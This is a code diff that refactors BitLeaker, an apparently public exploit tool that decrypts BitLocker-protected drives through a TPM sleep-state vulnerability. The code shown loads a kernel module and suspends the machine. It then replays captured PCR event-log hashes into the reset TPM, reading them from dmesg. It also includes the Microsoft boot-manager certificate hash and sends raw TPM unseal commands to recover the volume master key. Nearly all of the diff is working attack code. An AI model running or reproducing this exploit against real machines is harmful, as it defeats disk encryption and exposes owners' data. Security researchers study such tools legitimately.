@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 #-*- coding: utf-8 -*-
 #
 #                           BitLeaker 
@@ -11,6 +11,7 @@
 #
 
 import subprocess
+from enum import Enum
 import os
 import sys
 import re
@@ -18,8 +19,11 @@ from binascii import hexlify,unhexlify
 from time import sleep
 
 
+tpm_device="device:/dev/tpm0"
 tpm_library_path = "LD_LIBRARY_PATH=tpm2-tools/src/.libs:TPM2.0-TSS/tcti/.libs:TPM2.0-TSS/sysapi/.libs"
-dislocker_library_path = "LD_LIBRARY_PATH=dislocker/src"
+dislocker_library_path = "LD_LIBRARY_PATH=dislocker/build/src"
+
+
 #
 # TPM data for unseal VMK of BitLocker
 #
@@ -36,44 +40,80 @@ data_tpm1_pcrpolicy_subheader = [0x00, 0x00, 0x00, 0x01, 0x00, 0x04]
 data_tpm2_unseal = [0x80, 0x02, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
 data_tpm1_unseal = [0x80, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x01, 0x5e, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
 
-# SHA256 of bootmgfw.efi certificate, it is used for PCR #7
-sha256_bootmgfw_cert = '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'
-#sha1_bootmgfw_cert = '8b4866854c0b829dd967a1d9f100a3920d412792'
-#sha1_bootmgfw_cert = '8cfba0f34dda0f98ba4acec8e609a5f0a2b426b3'
-sha1_bootmgfw_cert = '9fc713b7248d99a1a0db3d50c14eb9b4ff270721'
+class Color(Enum):
+    #
+    # Color codes
+    #
+    RED = '\033[1;31m'
+    GREEN = '\033[1;32m'
+    YELLOW = '\033[1;33m'
+    BLUE = '\033[1;34m'
+    MAGENTA = '\033[1;35m'
+    CYAN = '\033[1;36m'
+    WHITE = '\033[1;37m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    BLINK = '\033[5m'
+    SUCCESS = GREEN
+    FAIL = RED
 
-#
-# Color codes
-#
-RED = '\033[1;31m'
-GREEN = '\033[1;32m'
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-MAGENTA = '\033[1;35m'
-CYAN = '\033[1;36m'
-WHITE = '\033[1;37m'
-ENDC = '\033[0m'
-BOLD = '\033[1m'
-UNDERLINE = '\033[4m'
-BLINK = '\033[5m'
-SUCCESS = GREEN
-FAIL = RED
-filename = 'key.txt'
+class State(Enum):
+    NO_MARKER = 0
+    FOUND_MRKR1 = 1
+    FOUND_MRKR2 = 2
 
-#
-# Print colored message
-#
-def color_print(message, color):
-    sys.stdout.write(color + message + ENDC)
-    return
+class HashTypes(Enum):
+    SHA256 = 'SHA256'
+    SHA1   = 'SHA1'
 
-def info_print(message):
-    color_print(message, BOLD)
+class MicrosoftMaterial(Enum):
+    # SHA256 of bootmgfw.efi certificate, it is used for PCR #7 (TCG 2.0)
+    sha256_bootmgfw_cert = '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'
+    # SHA1 of bootmgfw.efi certificate, it is used for PCR #7 (TCG 1.2)
+    sha1_bootmgfw_cert = '9fc713b7248d99a1a0db3d50c14eb9b4ff270721'
 
-#
-# Show a banner.
-#
-def show_banner():
+class Display:
+    #
+    # Print colored message
+    #
+    def color_print(self, message, color=Color.WHITE):
+        sys.stdout.write(color.value + message + color.ENDC.value)
+        return
+
+    #
+    # Show a banner.
+    #
+    def show_banner(self):
+        print(self.banner)
+
+    def info_print(self, message):
+        self.color_print(message, Color.BOLD)
+
+    def debug_print(self, message, color=Color.YELLOW):
+        if self.debug == False: return
+        self.color_print(message, color)
+
+    def display_pcrs(self, lines, color=Color.BLUE):
+        if self.debug == False: return
+        for line in lines:
+            str = ' '.join(line)+'\n'
+            self.debug_print(str, color)
+
+    def display_raw_logs(self, lines, color=Color.YELLOW):
+        if self.debug == False: return
+        for line in lines:
+            str = ''.join(line)+'\n'
+            debug_print(line, color)
+
+
+class BitLeaker(Display):
+    bitlocker_drive = ''
+    module_loaded=False
+    debug=False
+    tcg_version='2.0'
+    raw_log_data=[]
+    processed_logs=[]
     banner = """\
                                                 ,║▒▒▒▒▒▒@╖
                                                ╥▒▒╝    ▒▒▒╢
@@ -109,223 +149,403 @@ def show_banner():
             ░▒L░░└   ░░  ░▒ ░ ░░▒!▒▒ ░ ░  ░ ░░└ ░ ▒
              ▒L░       ░▒  ░ ░      ░ ░ ░ └ ░
 
-""" + \
-    GREEN +'    BitLeaker v1.0 for decrypting BitLocker with the TPM vulnerability\n' + ENDC + \
+    """ + \
+    Color.GREEN.value +'    BitLeaker v1.0 for decrypting BitLocker with the TPM vulnerability\n' + Color.ENDC.value + \
     '             Made by Seunghun Han, https://kkamagui.github.io\n' + \
     '           Project link: https://github.com/kkamagui/bitleaker \n'
-    print(banner)
 
-#
-# Prepare PCR data from dmesg
-#
-def prepare_pcr_data():
-    """
-    [   27.955579] bitleaker: Virt FFFFAF80C55E0000 Phys 80000
-    [   27.955582] bitleaker: evet_version = 2
-    [   27.955588] bitleaker: TCG_PCR_EVENT size 36 TCG_PCR_EVENT2 size 12
-    [   27.955595] bitleaker: Start 0x6f484000, End 0x6f48ebd5, Trunc 0
-    [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
-    [   27.955627] bitleaker: [2] PCR 0, Event 8, SHA256= d4 72 0b 40 09 43 82 13 b8 03 56 80 17 f9 03 09 3f 6b ea 8a b4 7d 28 3d b3 2b 6e ab ed bb f1 55 
-    [   27.955642] bitleaker: [3] PCR 0, Event 1, SHA256= db e1 4c 63 b7 d0 be dd 3f aa 9d b8 8f 9c 34 ad 75 a6 91 f7 c0 17 7f 70 1e ee 59 5d 44 d9 62 bc 
-    [   27.955661] bitleaker: [4] PCR 7, Event 80000001, SHA256= cc fc 4b b3 28 88 a3 45 bc 8a ea da ba 55 2b 62 7d 99 34 8c 76 76 81 ab 31 41 f5 b0 1e 40 a4 0e 
-    [   27.955678] bitleaker: [5] PCR 7, Event 80000001, SHA256= 78 68 42 98 cc 54 cf 75 50 bd 38 d3 c3 78 ee ee 59 d3 ae 02 76 32 cd a6 f5 07 ac 5c cd 25 7b 35 
-    ... omitted ...
-    [   27.957613] bitleaker: == End of Data ==
-    """
-    info_print('Loading BitLeaker kernel module... ')
-    #subprocess.getoutput('sudo insmod bitleaker-kernel-module/bitleaker-kernel-module.ko')
-    #subprocess.getoutput('sudo insmod bitleaker-kernel-module/bitleaker-kernel-module-5.3.ko')
-    subprocess.getoutput('sudo modprobe bitleaker-kernel-module')
-    color_print('Success\n', SUCCESS)
-    
-    info_print('Entering sleep...\n')
-    info_print('    [>>] Please press any key or power button to wake up...')
-    input('')
-    subprocess.getoutput('systemctl suspend')
-    info_print('Waking up...\n')
-    info_print('    [>>] Please press any key to continue...')
-    input('')
-    info_print('\n')
 
-    info_print('Preparing PCR data.\n')
-    info_print('    [>>] Get PCR data from BitLeaker driver... '),
-    output = subprocess.getoutput('sudo dmesg').split('\n')
-
-    first_marker_found = 0
-    second_marker_found = 0
-    raw_data = []
-    for line in output:
-        if 'Dump event logs' in line:
-            first_marker_found = 1
-
-        if first_marker_found == 1 and 'SHA1' in line:
-            second_marker_found = 1
-
-        if second_marker_found == 1 and 'End of Data' in line:
-            break
-
-        if second_marker_found == 1:
-            raw_data.append(line)
-    
-    if len(raw_data) == 0:
-        color_print('Fail\n', FAIL)
-        sys.exit(-1)
-    color_print('Success\n\n', SUCCESS)
-
-    return raw_data
-
-def read_canned_pcr_data(filename):
-    f = open(filename, 'r')
-    output = f.readlines()
-    f.close()
-
-    first_marker_found = 0
-    second_marker_found = 0
-    raw_data = []
-    for line in output:
-        if 'Dump event logs' in line:
-            first_marker_found = 1
-
-        if first_marker_found == 1 and 'SHA1' in line:
-            second_marker_found = 1
-
-        if second_marker_found == 1 and 'End of Data' in line:
-            break
-
-        if second_marker_found == 1:
-            raw_data.append(line)
-    
-    info_print('Entering sleep...\n')
-    info_print('    [>>] Please press any key or power button to wake up...')
-    input('')
-    subprocess.getoutput('systemctl suspend')
-    info_print('Waking up...\n')
-    info_print('    [>>] Please press any key to continue...')
-    input('')
-    info_print('\n')
-
-    if len(raw_data) == 0:
-        color_print('Fail\n', FAIL)
-        sys.exit(-1)
-    color_print('Success\n\n', SUCCESS)
-
-    return raw_data
-    
-
-#
-# Cut PCR data and extract pcr_list
-#
-def cut_and_extract_essential_pcr_data(raw_data):
-    """
-    [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
-    """
-    info_print('Cut and extract essential PCR data.\n')
-   
-    extracted_raw_data = []
-    ev_separator_found = 0
-    for line in raw_data:
-        #if ev_separator_found == 1 and 'PCR 7' in line:
-        #    break
+    def __init__(self,debug=False):
+        self.module_loaded = False
+        self.raw_log_data = []
+        self.processed_logs = []
+        self.debug = debug
+        self.bitlocker_drive = ''
+        self.show_banner()
+        self.manage_kernel_module('start')
+        self.hash_type = HashTypes.SHA256
+        self.FNULL = open(os.devnull, 'w')
         
-        if 'Event 80000003' in line:
-            break
- 
-        extracted_raw_data.append(line)
+    # Try to enter sleep
+    #
+    def doze(self):
+        if self.module_loaded:
+          self.info_print('Entering sleep...\n')
+          self.info_print('    [>>] Press [Enter] to doze...')
+          input('')
+          subprocess.call(['sudo','rtcwake','--mode','mem','-s','5'], stdout=self.FNULL, stderr=self.FNULL)
+          self.info_print('    [<<] Concious...\n')
+          sleep(1)
+          return 1
+        else:
+          self.color_print('BitLeaker module is not loaded.', Color.FAIL)
+          return 0
 
-    info_print('    [>>] Extract PCR numbers and SHA1 hashes... ')
-    
-    # Extract PCR numbers and SHA1 hashes
-    pcr_list = []
-    for line in extracted_raw_data:
-        # PCR number
-        match = re.search(r'\d+?,', line)
-        pcr_num = match.group(0).replace(',', ' ')
+    #
+    # Collect the system logs containing the PCRs
+    #
+    def collect_pcr_logs(self, filename=''):
+        """
+        [   27.955579] bitleaker: Virt FFFFAF80C55E0000 Phys 80000
+        [   27.955582] bitleaker: evet_version = 2
+        [   27.955588] bitleaker: TCG_PCR_EVENT size 36 TCG_PCR_EVENT2 size 12
+        [   27.955595] bitleaker: Start 0x6f484000, End 0x6f48ebd5, Trunc 0
+        [   27.955610] bitleaker: [1] PCR 0, Event 7, SHA256= 31 37 22 f6 4f 2a 08 57 c6 01 26 6c 89 bf 21 70 0a 7c 4e 79 dc 96 76 4c 2a 35 55 68 2a 3c 7b 7a 
+        [   27.955627] bitleaker: [2] PCR 0, Event 8, SHA256= d4 72 0b 40 09 43 82 13 b8 03 56 80 17 f9 03 09 3f 6b ea 8a b4 7d 28 3d b3 2b 6e ab ed bb f1 55 
+        [   27.955642] bitleaker: [3] PCR 0, Event 1, SHA256= db e1 4c 63 b7 d0 be dd 3f aa 9d b8 8f 9c 34 ad 75 a6 91 f7 c0 17 7f 70 1e ee 59 5d 44 d9 62 bc 
+        [   27.955661] bitleaker: [4] PCR 7, Event 80000001, SHA256= cc fc 4b b3 28 88 a3 45 bc 8a ea da ba 55 2b 62 7d 99 34 8c 76 76 81 ab 31 41 f5 b0 1e 40 a4 0e 
+        [   27.955678] bitleaker: [5] PCR 7, Event 80000001, SHA256= 78 68 42 98 cc 54 cf 75 50 bd 38 d3 c3 78 ee ee 59 d3 ae 02 76 32 cd a6 f5 07 ac 5c cd 25 7b 35 
+        ... omitted ...
+        [   27.957613] bitleaker: == End of Data ==
+        """
+        self.raw_log_data = []
+        self.info_print('Collecting {0} PCRs from system logs...\n'.format(self.hash_type.value))
+        try:
+            if filename == '':
+                output = subprocess.check_output(['dmesg'],encoding='UTF-8').split('\n');
+            else:
+                infile =  open(filename, 'r')
+                output = infile.readlines()
+                infile.close()
+            state = State.NO_MARKER
+            for line in output:
+                if state == State.FOUND_MRKR1:
+                    if self.hash_type.value in line:
+                        state = State.FOUND_MRKR2
+                if state == State.FOUND_MRKR2:
+                    if 'End of Data' in line:
+                        break
+                    self.raw_log_data.append(line)           
+                if state == State.NO_MARKER:
+                    if 'Dump event logs' in line:
+                        state = State.FOUND_MRKR1
+        except:
+           pass 
+        self.info_print('    [>>] Found {0:d} log lines.\n'.format(len(self.raw_log_data)))
+        self.display_raw_logs(self.raw_log_data,Color.YELLOW)
+        return self.raw_log_data
+
+    def process_pcr_logs(self):
+        selected_raw_logs = []
+        if len(self.raw_log_data)==0: return False
+        self.info_print('Processing logs...\n')
+        ev_separator_found = False
+        for line in self.raw_log_data:
+            if ev_separator_found and 'PCR 7' in line:
+                break
+            if 'Event 4' in line:
+                ev_separator_found = True
+
+            selected_raw_logs.append(line)
+
+        self.info_print('    [>>] Extract PCR numbers and {0} hashes... \n'.format(self.hash_type.value))
+        expression = r'(?<={0}=).*'.format(self.hash_type.value)
+        for line in selected_raw_logs:
+            match = re.search(r'\d+?,', line)
+            pcr_num = match.group(0).replace(',', ' ')
+
+            match = re.search(expression, line)
+            hash  = match.group(0).replace(' ', '')
+            self.processed_logs.append([pcr_num, hash])
+
+        if len(self.processed_logs) != 0:
+            self.color_print('Found {0} PCR logs.\n'.format(len(self.processed_logs)), Color.SUCCESS)
+            self.display_pcrs(self.processed_logs)
+            return True
+        else:
+            self.color_print('    [>>>]NO PCR LOGS FOUND[<<<]\n', Color.FAIL)
+            return False
         
-        # SHA 1
-        match = re.search(r'(?<=SHA1=).*', line)
-        sha1 = match.group(0).replace(' ', '')
+    def leak(self,filename=''):
+        if self.module_loaded:
+            self.info_print('Preparing PCR data...\n')
+            if self.doze():
+                if len(self.collect_pcr_logs(filename)) == 0:
+                    self.hash_type = HashTypes.SHA1
+                    if len(self.collect_pcr_logs(filename)) == 0:
+                       self.color_print("    [>>>] NO LOGS FOUND! Check BitLeaker kernel module. [<<<]\n",Color.RED)
+                       sys.exit(-1)
+        else:
+            self.color_print("    [>>>] Bitleaker module not loaded.  Fix this! [<<<]\n",Color.RED)
 
-        pcr_list.append([pcr_num, sha1])
+    def start_tpm(self):
+        self.info_print("Restarting TPM...")
+        subprocess.check_call(['sudo','TPMTOOLS2_TCTI="{0}"'.format(tpm_device),'tpm2_startup','-c'])
+        self.info_print("   [>>] Waiting for you to run selftest")
+        input('')
+        #subprocess.check_call(['sudo','TPMTOOLS2_TCTI="{0}"'.format(tpm_device),'tpm2_selftest','-f'])
+        self.info_print("   [>>] Done...")
+    
+    def manage_kernel_module(self, mode="start"):
+        if mode == "start" and not self.module_loaded:
+            try:
+                #subprocess.getoutput('sudo modprobe bitleaker-kernel-module')
+                output = subprocess.check_output(['lsmod'])
+                if b'leak' in output:
+                    self.module_loaded = True
+                    self.color_print('BitLeaker Module LOADED.\n', Color.SUCCESS)
+                else:
+                    subprocess.check_call(['sudo','insmod','./bitleaker-kernel-module/bitleaker-kernel-module.ko'])
+                    self.color_print('BitLeaker Module LOADED.\n', Color.SUCCESS)
+                    self.module_loaded = True
+            except subprocess.CalledProcessError as e:
+                self.color_print('BitLeaker Module FAILED loading.\n', Color.FAIL)
+            if self.module_loaded: return True
+            else: return False
+        if mode == "stop" and self.module_loaded:
+            try:
+                subprocess.check_call(['sudo','false','./bitleaker-kernel-module/bitleaker-kernel-module.ko'])
+                self.module_loaded = False
+            except subprocess.CalledProcessError as e:
+                self.color_print('Stop FAILED\n',Color.FAIL)
+            if self.module_loaded == False: return True
+            else: return False
 
-    if len(pcr_list) != 0:
-        color_print('Success\n\n', SUCCESS)
-    else:
-        color_print('Fail\n\n', FAIL)
-        sys.exit(-1)
+    def find_bitlocker_parition(self,filename=''):
+        if filename=='':
+            self.info_print('Finding BitLocker partitions... \n')
+            output = subprocess.check_output('sudo fdisk -l 2>/dev/null | grep "Microsoft basic data"', encoding='UTF-8',shell=True).split('\n')
+            if len(output) == 0:
+                self.color_print('    [>>] BitLocker-locked parition is not found.\n', Color.FAIL)
+                self.info_print('    [>>] Please try with the explicit drive path.  ./bitleaker-3-v1.py <drive path>\n')
+                return False
+            self.bitlocker_drive = output[0].split(' ')[0]
+        else:
+            self.bitlocker_drive = filename
+        self.info_print('    [>>] BitLocker-locked partition is [%s]\n\n' % self.bitlocker_drive)
+        return True
 
-    info_print('    [>>] Stored list:\n')
-    print(pcr_list)
-    return pcr_list
+    def bitlocker_path(self):
+        return self.bitlocker_drive
 
-#
-# Check resource manager is running and run it
-#
-def check_and_run_resource_manager():
-    info_print('    [>>] Checking the resource manager process... ')
-    sys.stdout.flush()
+    def logs(self):
+        return self.processed_logs
 
-    output = subprocess.getoutput('sudo ps -e | grep resourcemgr')
-    if 'resourcemgr' in output:
-        color_print('Running\n', SUCCESS)
+    def type(self):
+        return self.hash_type.value
+
+filename = 'key.txt'
+
+class TPMInterface(Display):
+    _type = HashTypes.SHA256.value
+    logs = []
+    def __init__(self, logs, type=HashTypes.SHA256.value):
+        self._type = type
+        self.logs = logs
+
+    def Type(self):
+        return self._type
+
+    #
+    # Check resource manager is running and run it
+    #
+    def start_rsrc_mgr(self):
+        output = subprocess.getoutput('sudo ps -e | grep resourcemgr')
+        if 'resourcemgr' in output:
+            self.info_print('    [>>] Resource manager process... ')
+            sys.stdout.flush()
+            self.color_print('Running\n', Color.SUCCESS)
+            return 0
+
+        self.info_print('    [>>] Starting resource manager process... ')
+        sys.stdout.flush()
+        pid = os.fork()
+        if pid == 0:
+            subprocess.getoutput('sudo %s TPM2.0-TSS/resourcemgr/resourcemgr > /dev/null' % (tpm_library_path))
+            sys.exit(0)
+        else:
+            # Wait for the resource manager
+            resourcemgr_found = False
+
+            for i in range(0, 10):
+                output = subprocess.getoutput('ps -e | grep resourcemgr')
+                if len(output) != 0:
+                    resourcemgr_found = True
+                    break
+                sleep(1)
+
+            if resourcemgr_found == False:
+                self.color_print('Fail\n', Color.FAIL)
+                sys.exit(-1)
+
+        self.color_print('Success\n', Color.SUCCESS)
+        sleep(2)
         return 0
 
-    pid = os.fork()
-    if pid == 0:
-        subprocess.getoutput('sudo %s TPM2.0-TSS/resourcemgr/resourcemgr > /dev/null' % (tpm_library_path))
-        sys.exit(0)
-    else:
-        # Wait for the resource manager
-        resourcemgr_found = False
+    def stop_rsrc_mgr(self):
+        subprocess.call('sudo killall resourcemgr',shell=True)
+        return
 
-        for i in range(0, 10):
-            output = subprocess.getoutput('ps -e | grep resourcemgr')
-            if len(output) != 0:
-                resourcemgr_found = True
-                break
+    def tpm_extendpcr(self,pcr,hash):
+        local_pcr = pcr.replace(' ','')
+        if self._type == 'SHA256':
+            #output = subprocess.check_output('%s tpm2-tools/src/tpm2_extendpcrs -g 0x0b -P %s -i %s' % (tpm_library_path, pcr, hash), shell=True, encoding='UTF-8')
+            output = subprocess.check_output('tpm2_pcrextend %s:sha256=%s' % (local_pcr, hash), shell=True, encoding='UTF-8')
+        else:
+            #output = subprocess.check_output('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P %s -i %s' % (tpm_library_path, pcr, hash), shell=True, encoding='UTF-8')
+            output = subprocess.check_output('tpm2_pcrextend %s:sha1=%s' % (local_pcr, hash), shell=True, encoding='UTF-8')
+        return output
 
-            sleep(1)
+    def tpm_listpcrs(self):
+        if self._type == 'SHA256':
+            #output = subprocess.check_output('%s tpm2-tools/src/tpm2_listpcrs -g 0x0b' % (tpm_library_path), shell=True, encoding='UTF-8')
+            output = subprocess.check_output('tpm2_pcrread sha256', shell=True, encoding='UTF-8')
+        else:
+            #output = subprocess.check_output('%s tpm2-tools/src/tpm2_listpcrs -g 0x04' % (tpm_library_path), shell=True, encoding='UTF-8')
+            output = subprocess.check_output('tpm2_pcrread sha1', shell=True, encoding='UTF-8')
+        return output
 
-        if resourcemgr_found == False:
-            color_print('Fail\n', FAIL)
-            sys.exit(-1)
+    #
+    # Replay PCR data to the TPM
+    #
+    def replay_logs(self):
+        self.info_print('Replay TPM data.\n')
 
-    color_print('Success\n', SUCCESS)
-    sleep(3)
-    return 0
+        #self.start_rsrc_mgr()
+    
+        output = self.tpm_listpcrs()
+        print(output + '\n')
+        for pcr_data in self.logs:
+            self.info_print('    [>>] PCR %s, SHA1 = %s\n' % (pcr_data[0], pcr_data[1]))
+            output = self.tpm_extendpcr(pcr_data[0], pcr_data[1])
+            print(output + '\n')
 
-#
-# Replay PCR data to the TPM
-#
-def replay_pcr_data(pcr_list):
-    info_print('Replay TPM data.\n')
-    check_and_run_resource_manager()
-
-    output = subprocess.getoutput('%s tpm2-tools/src/tpm2_listpcrs -g 0x04' % (tpm_library_path))
-    print(output + '\n')
-    for pcr_data in pcr_list:
-        info_print('    [>>] PCR %s, SHA1 = %s\n' % (pcr_data[0], pcr_data[1]))
-        output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P %s -i %s' % (tpm_library_path, pcr_data[0], pcr_data[1]))
+        # Last one for PCR #7
+        last_hash = MicrosoftMaterial.sha256_bootmgfw_cert.value
+        if self._type == HashTypes.SHA1.value:
+            last_hash = MicrosoftMaterial.sha1_bootmgfw_cert.value
+        self.info_print('    [>>] Last PCR 7, SHA1 = %s\n' % (last_hash))
+        output = self.tpm_extendpcr('7',last_hash)
+        output = self.tpm_listpcrs()
         print(output + '\n')
 
-    # Last one for PCR #7
-    info_print('    [>>] Last PCR 7, SHA1 = %s\n' % (sha1_bootmgfw_cert))
-    #info_print('    [>>] Last PCR 7, SHA1 = %s\n' % (sha256_bootmgfw_cert))
-    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 4 -i %s' % (tpm_library_path, 'dbacc822c8778d9b40b862daf318cf718757123b'))
-    #print(output + '\n')
-    output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 7 -i %s' % (tpm_library_path, sha1_bootmgfw_cert))
-    print(output + '\n')
-    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 4 -i %s' % (tpm_library_path, 'dbacc822c8778d9b40b862daf318cf718757123b'))
-    #print(output + '\n')
-    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 11 -i %s' % (tpm_library_path, '5497b0911b3f5772723def3b360a2e654327c19b'))
-    #print(output + '\n')
-    #output = subprocess.getoutput('%s tpm2-tools/src/tpm2_extendpcrs -g 0x04 -P 11 -i %s' % (tpm_library_path, '3a4072cc6b77e2639d4fdc91c91efc11bc3e33c3'))
-    #print(output + '\n')
+        #self.stop_rsrc_mgr()
 
-    output = subprocess.getoutput('%s tpm2-tools/src/tpm2_listpcrs -g 0x04' % (tpm_library_path))
-    print(output + '\n')
+    #
+    # Prepare TPM data for unsealing VMK of BitLocker
+    #
+    def prepare_tpm_data(self, drive_path):
+        self.info_print('Preparing TPM data.\n')
+        self.info_print('    [>>] Get TPM-encoded blob from dislocker... ')
+        raw_data_list = get_raw_tpm_encoded_blob_from_dislocker(drive_path)
+        if raw_data_list == []:
+            print('BitLeaker: Error. %s is not BitLocker-locked partition\n' % drive_path)
+            sys.exit(-1)
+        self.color_print('Success\n', Color.SUCCESS)
 
-#    os.system('sudo killall resourcemgr')
-    
+        self.info_print('    [>>] Convert TPM-encoded blob to hex data... ')
+        hex_priv_pub, pcr_policy = extract_priv_pub_and_pcr_policy_from_raw_blob(raw_data_list)
+        self.color_print('Success\n', Color.SUCCESS)
+        self.info_print('    [>>] raw_data_list:\n%s,%d\n' % (raw_data_list, len(raw_data_list)))
+        self.info_print('    [>>] hex_priv:\n%s,%d\n' % (hex_priv_pub, len(hex_priv_pub)))
+        self.info_print('    [>>] pcr_policy:\n%s,%d\n' % (pcr_policy, len(pcr_policy)))
+
+        # Prepare TPM1_Load data
+        self.info_print('    [>>] Create TPM1_Load data... ')
+        data = data_tpm1_load_header + hex_priv_pub
+        file = open('tpm1_load.bin', 'wb')
+        file.write(bytearray(data))
+        file.close()
+        self.color_print('Success\n', Color.SUCCESS)
+
+        # Prepare TPM1_StartSession data
+        self.info_print('    [>>] Create TPM1_StartSession data... ')
+        data = data_tpm1_startsession
+        file = open('tpm1_startsession.bin', 'wb')
+        file.write(bytearray(data))
+        file.close()
+        self.color_print('Success\n', Color.SUCCESS)
+
+        # Prepare TPM1_PolicyAuthorize data
+        self.info_print('    [>>] Create TPM1_PolicyAuthorize data... ')
+        data = data_tpm1_policyauthorize
+        file = open('tpm1_policyauthorize.bin', 'wb')
+        file.write(bytearray(data))
+        file.close()
+        self.color_print('Success\n', Color.SUCCESS)
+
+        # Prepare TPM1_PCRPolicy data
+        self.info_print('    [>>] Create TPM1_PolicyPCR data... ')
+        data1 = data_tpm1_pcrpolicy_header + pcr_policy[:len(pcr_policy) - 4]
+        data2 = data_tpm1_pcrpolicy_subheader + pcr_policy[len(pcr_policy) - 4:]
+        file = open('tpm1_policypcr.bin', 'wb')
+        file.write(bytearray(data1))
+        file.write(bytearray(data2))
+        file.close()
+        self.color_print('Success\n', Color.SUCCESS)
+
+        # Prepare TPM1_Unseal data
+        self.info_print('    [>>] Create TPM1_Unseal data... ')
+        data = data_tpm1_unseal
+        file = open('tpm1_unseal.bin', 'wb')
+        file.write(bytearray(data))
+        file.close()
+        self.color_print('Success\n\n', Color.SUCCESS)
+
+    #
+    # Execute TPM1 command data for unsealing VMK 
+    #
+    def execute_tpm_cmd_and_extract_vmk(self):
+        self.info_print('Execute TPM commands\n')
+        # Execute TPM1_Load command 
+        self.info_print('    [>>] Execute TPM1_Load... ')
+        output = subprocess.check_output('sudo tpm2_send < tpm1_load.bin',shell=True,encoding='UTF-8')
+        #output = subprocess.getoutput('sudo %s ./tpm2-tools/src/tpm2_loadexternal -H n -u pubkey.bin -r privkey.bin' % tpm_library_path)
+        print(output)
+        if 'Fail' in output:
+            self.color_print('    [>>] Fail\n\n', Color.FAIL)
+            sys.exit(-1)
+        self.color_print('    [>>] Success\n\n', Color.SUCCESS)
+        sleep(2)
+
+        # Execute TPM1_StartSession command 
+        self.info_print('    [>>] Execute TPM1_StartSession... ')
+        output = subprocess.check_output('sudo tpm2_send < tpm1_startsession.bin',shell=True,encoding='UTF-8')
+        #output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_startsession.bin' % tpm_library_path)
+        print(output)
+        if 'Fail' in output:
+            self.color_print('    [>>] Fail\n\n', Color.FAIL)
+            sys.exit(-1)
+        self.color_print('    [>>] Success\n\n', Color.SUCCESS)
+        sleep(2)
+
+        # Execute TPM1_PolicyAuthorize command 
+        self.info_print('    [>>] Execute TPM1_PolicyAuthorize... ')
+        output = subprocess.check_output('sudo tpm2_send < tpm1_policyauthorize.bin',shell=True,encoding='UTF-8')
+        #output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_policyauthorize.bin' % tpm_library_path)
+        print(output)
+        if 'Fail' in output:
+            self.color_print('    [>>] Fail\n\n', Color.FAIL)
+            sys.exit(-1)
+        self.color_print('    [>>] Success\n\n', Color.SUCCESS)
+        sleep(2)
+
+        # Execute TPM1_PolicyPCR command 
+        self.info_print('    [>>] Execute TPM1_PolicyPCR... ')
+        output = subprocess.check_output('sudo tpm2_send < tpm1_policypcr.bin',shell=True,encoding='UTF-8')
+        #output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_policypcr.bin' % tpm_library_path)
+        print(output)
+        if 'Fail' in output:
+            self.color_print('    [>>] Fail\n\n', Color.FAIL)
+            sys.exit(-1)
+        self.color_print('    [>>] Success\n\n', Color.SUCCESS)
+        sleep(2)
+
+        # Execute TPM1_Unseal command 
+        self.info_print('    [>>] Execute TPM1_Unseal... ')
+        output = subprocess.check_output('sudo tpm2_send < tpm1_unseal.bin',shell=True,encoding='UTF-8')
+        #output = subprocess.getoutput('sudo %s ./TPM2.0-TSS/test/tpmtcticlient/tpmtcticlient -i tpm1_unseal.bin' % tpm_library_path)
+        print(output)
+        if 'Fail' in output:
+            self.color_print('    [>>] Fail\n\n', Color.FAIL)
+            sys.exit(-1)
+        self.color_print('    [>>] Success\n\n', Color.SUCCESS)
+        sleep(2)
+
+        # Extract VMK from TPM result
+        vmk_data = extract_vmk_from_tpm_result(output.split('\n'))
+        return vmk_data
+
 # 
 # Extract TPM encoded blob from Dislocker tool
 #
@@ -350,9 +570,9 @@ def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
     Thu Oct 10 15:01:04 2019 [DEBUG] 0x00000100 08 00
     """
     # Run Dislocker with debug mode
-    print("Library path: %s, drive_path %s\n" % (dislocker_library_path,drive_path))
-    output = subprocess.getoutput('sudo %s dislocker/src/dislocker-metadata -v -v -v -v -V %s' % (dislocker_library_path, drive_path)).split('\n')
-    print("output = %s" % (output))
+    #print("Library path: %s, drive_path %s\n" % (dislocker_library_path,drive_path))
+    output = subprocess.getoutput('sudo %s dislocker-metadata -v -v -v -v -V %s' % (dislocker_library_path, drive_path)).split('\n')
+    #print("output = %s" % (output))
 
     first_marker_found = 0
     second_marker_found = 0
@@ -376,8 +596,8 @@ def get_raw_tpm_encoded_blob_from_dislocker(drive_path):
